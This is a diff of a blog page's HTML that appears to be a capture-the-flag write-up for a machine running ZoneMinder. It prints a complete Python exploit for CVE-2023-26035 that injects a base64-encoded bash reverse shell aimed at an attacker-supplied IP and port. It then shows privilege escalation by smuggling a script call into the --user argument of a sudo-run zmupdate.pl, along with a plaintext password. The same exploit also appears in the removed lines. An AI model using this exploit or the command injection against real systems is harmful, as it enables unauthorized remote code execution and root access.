@@ -251,63 +251,89 @@ There is a zoneminder service running that is a monitored technology lets port f
 Info about zoneminder versions, lets look for some vulnerability
 <br /><br />
 (CVE-202326035) POC 
+<br /><br /></p>
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
+<span class="kn">import</span> <span class="nn">argparse</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+<span class="c1"># CVE-2023-26035 - Unauthenticated RCE in ZoneMinder Snapshots
+# Author : Ravindu Wickramasinghe | rvz (@RVIZX9)
+</span><span class="k">class</span> <span class="nc">ZoneMinderExploit</span><span class="p">:</span>
+  <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">target_uri</span><span class="p">):</span>
+      <span class="bp">self</span><span class="p">.</span><span class="n">target_uri</span> <span class="o">=</span> <span class="n">target_uri</span>
+      <span class="bp">self</span><span class="p">.</span><span class="n">csrf_magic</span> <span class="o">=</span> <span class="bp">None</span>
+  <span class="k">def</span> <span class="nf">fetch_csrf_token</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+      <span class="k">print</span><span class="p">(</span><span class="s">"[&gt;] fetching csrt token"</span><span class="p">)</span>
+      <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">target_uri</span><span class="p">)</span>
+      <span class="bp">self</span><span class="p">.</span><span class="n">csrf_magic</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">get_csrf_magic</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
+      <span class="k">if</span> <span class="n">response</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span> <span class="ow">and</span> <span class="n">re</span><span class="p">.</span><span class="n">match</span><span class="p">(</span><span class="sa">r</span><span class="s">'^key:[a-f0-9]{40},\d+'</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">csrf_magic</span><span class="p">):</span>
+          <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[&gt;] recieved the token: </span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">csrf_magic</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+          <span class="k">return</span> <span class="bp">True</span>
+      <span class="k">print</span><span class="p">(</span><span class="s">"[!] unable to fetch or parse token."</span><span class="p">)</span>
+      <span class="k">return</span> <span class="bp">False</span>
+  <span class="k">def</span> <span class="nf">get_csrf_magic</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">response</span><span class="p">):</span>
+      <span class="k">return</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="s">'html.parser'</span><span class="p">).</span><span class="n">find</span><span class="p">(</span><span class="s">'input'</span><span class="p">,</span> <span class="p">{</span><span class="s">'name'</span><span class="p">:</span> <span class="s">'__csrf_magic'</span><span class="p">}).</span><span class="n">get</span><span class="p">(</span><span class="s">'value'</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>
+  <span class="k">def</span> <span class="nf">execute_command</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">cmd</span><span class="p">):</span>
+      <span class="k">print</span><span class="p">(</span><span class="s">"[&gt;] sending payload.."</span><span class="p">)</span>
+      <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">'view'</span><span class="p">:</span> <span class="s">'snapshot'</span><span class="p">,</span> <span class="s">'action'</span><span class="p">:</span> <span class="s">'create'</span><span class="p">,</span> <span class="s">'monitor_ids[0][Id]'</span><span class="p">:</span> <span class="sa">f</span><span class="s">';</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s">'</span><span class="p">,</span> <span class="s">'__csrf_magic'</span><span class="p">:</span> <span class="bp">self</span><span class="p">.</span><span class="n">csrf_magic</span><span class="p">}</span>
+      <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">target_uri</span><span class="si">}</span><span class="s">/index.php"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+      <span class="k">print</span><span class="p">(</span><span class="s">"[&gt;] payload sent"</span> <span class="k">if</span> <span class="n">response</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span> <span class="k">else</span> <span class="s">"[!] failed to send payload"</span><span class="p">)</span>
+  <span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">payload</span><span class="p">):</span>
+      <span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">fetch_csrf_token</span><span class="p">():</span>
+          <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[&gt;] executing..."</span><span class="p">)</span>
+          <span class="bp">self</span><span class="p">.</span><span class="n">execute_command</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+  <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
+  <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-t'</span><span class="p">,</span> <span class="s">'--target-url'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'target url endpoint'</span><span class="p">)</span>
+  <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-ip'</span><span class="p">,</span> <span class="s">'--local-ip'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'local ip'</span><span class="p">)</span>
+  <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-p'</span><span class="p">,</span> <span class="s">'--port'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'port'</span><span class="p">)</span>
+  <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>
+  <span class="c1"># generating the payload
+</span>  <span class="n">ps1</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"bash -i &gt;&amp; /dev/tcp/</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">local_ip</span><span class="si">}</span><span class="s">/</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">port</span><span class="si">}</span><span class="s"> 0&gt;&amp;1"</span>  
+  <span class="n">ps2</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">ps1</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="n">decode</span><span class="p">()</span>
+  <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"echo </span><span class="si">{</span><span class="n">ps2</span><span class="si">}</span><span class="s"> | base64 -d | /bin/bash"</span>
+  <span class="n">ZoneMinderExploit</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">target_url</span><span class="p">).</span><span class="n">exploit</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</code></pre></div>    </div>
+    <p><br /><br />
+<img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_13.png" alt="Untitled" />
 <br /><br />
-```bash
-import re
-import requests
-from bs4 import BeautifulSoup
-import argparse
-import base64</p>
+Access as zoneminder
+<br /><br />
+<img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_14.png" alt="Untitled" />
+<br /><br />
+check for premises
+<br /><br />
+<img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_15.png" alt="Untitled" />
+<br /><br />
+We can update db and change others file in zm
+<br /><br />
+But we are no going to update anything we are going to pass a revshell in user update
+<br /><br /></p>
+    <ol>
+      <li>We can stabilize the shell using import ptty but it is not necessary, we create the revshell and pass it trought a python server
+<br /><br />
+<img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_16.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_17.png" alt="Untitled" />
+<br /><br />
+chmod 700 or chmod  +x  for permisses
+<br /><br />
+We need to be listening at the port specify 
+<br /><br />
+And as a final step:
+<br /><br />
+<img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_18.png" alt="Untitled" />
+<br /><br />
+        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> /usr/bin/zmupdate.pl <span class="nt">--version</span><span class="o">=</span>1 <span class="nt">--user</span><span class="o">=</span><span class="s1">'$(/tmp/exploitfinalbello.sh)'</span> <span class="nt">--pass</span><span class="o">=</span>ZoneMinderPassword2023
+</code></pre></div>        </div>
+        <p><br /><br />
+Machined pwned!@1
+<script src="/assets/js/matrix-overlay.js"></script></p>
+      </li>
+    </ol>
   </li>
 </ul>
-
-<h1 id="cve-2023-26035---unauthenticated-rce-in-zoneminder-snapshots">CVE-2023-26035 - Unauthenticated RCE in ZoneMinder Snapshots</h1>
-<h1 id="author--ravindu-wickramasinghe--rvz-rvizx9">Author : Ravindu Wickramasinghe | rvz (@RVIZX9)</h1>
-
-<p>class ZoneMinderExploit:
-    def <strong>init</strong>(self, target_uri):
-        self.target_uri = target_uri
-        self.csrf_magic = None</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def fetch_csrf_token(self):
-    print("[&gt;] fetching csrt token")
-    response = requests.get(self.target_uri)
-    self.csrf_magic = self.get_csrf_magic(response)
-    if response.status_code == 200 and re.match(r'^key:[a-f0-9]{40},\d+', self.csrf_magic):
-        print(f"[&gt;] recieved the token: {self.csrf_magic}")
-        return True
-    print("[!] unable to fetch or parse token.")
-    return False
-
-def get_csrf_magic(self, response):
-    return BeautifulSoup(response.text, 'html.parser').find('input', {'name': '__csrf_magic'}).get('value', None)
-
-def execute_command(self, cmd):
-    print("[&gt;] sending payload..")
-    data = {'view': 'snapshot', 'action': 'create', 'monitor_ids[0][Id]': f';{cmd}', '__csrf_magic': self.csrf_magic}
-    response = requests.post(f"{self.target_uri}/index.php", data=data)
-    print("[&gt;] payload sent" if response.status_code == 200 else "[!] failed to send payload")
-
-def exploit(self, payload):
-    if self.fetch_csrf_token():
-        print(f"[&gt;] executing...")
-        self.execute_command(payload)
-</code></pre></div></div>
-
-<p>if <strong>name</strong> == “<strong>main</strong>”:
-    parser = argparse.ArgumentParser()
-    parser.add_argument(‘-t’, ‘–target-url’, required=True, help=’target url endpoint’)
-    parser.add_argument(‘-ip’, ‘–local-ip’, required=True, help=’local ip’)
-    parser.add_argument(‘-p’, ‘–port’, required=True, help=’port’)
-    args = parser.parse_args()</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># generating the payload
-ps1 = f"bash -i &gt;&amp; /dev/tcp/{args.local_ip}/{args.port} 0&gt;&amp;1"  
-ps2 = base64.b64encode(ps1.encode()).decode()
-payload = f"echo {ps2} | base64 -d | /bin/bash"
-
-ZoneMinderExploit(args.target_url).exploit(payload) ``` &lt;br/&gt;&lt;br/&gt; ![Untitled](/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_13.png) &lt;br/&gt;&lt;br/&gt; Access as zoneminder &lt;br/&gt;&lt;br/&gt; ![Untitled](/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_14.png) &lt;br/&gt;&lt;br/&gt; check for premises &lt;br/&gt;&lt;br/&gt; ![Untitled](/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_15.png) &lt;br/&gt;&lt;br/&gt; We can update db and change others file in zm &lt;br/&gt;&lt;br/&gt; But we are no going to update anything we are going to pass a revshell in user update &lt;br/&gt;&lt;br/&gt; 1. We can stabilize the shell using import ptty but it is not necessary, we create the revshell and pass it trought a python server &lt;br/&gt;&lt;br/&gt; ![Untitled](/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_16.png) &lt;br/&gt;&lt;br/&gt; ![Untitled](/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_17.png) &lt;br/&gt;&lt;br/&gt; chmod 700 or chmod  +x  for permisses &lt;br/&gt;&lt;br/&gt; We need to be listening at the port specify  &lt;br/&gt;&lt;br/&gt; And as a final step: &lt;br/&gt;&lt;br/&gt; ![Untitled](/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_18.png) &lt;br/&gt;&lt;br/&gt; ```bash sudo /usr/bin/zmupdate.pl --version=1 --user='$(/tmp/exploitfinalbello.sh)' --pass=ZoneMinderPassword2023 ``` &lt;br/&gt;&lt;br/&gt; Machined pwned!@1 &lt;script src="/assets/js/matrix-overlay.js"&gt;&lt;/script&gt;
-</code></pre></div></div>
 
 <link rel="stylesheet" href="/assets/css/imagesstyle.css" />
 
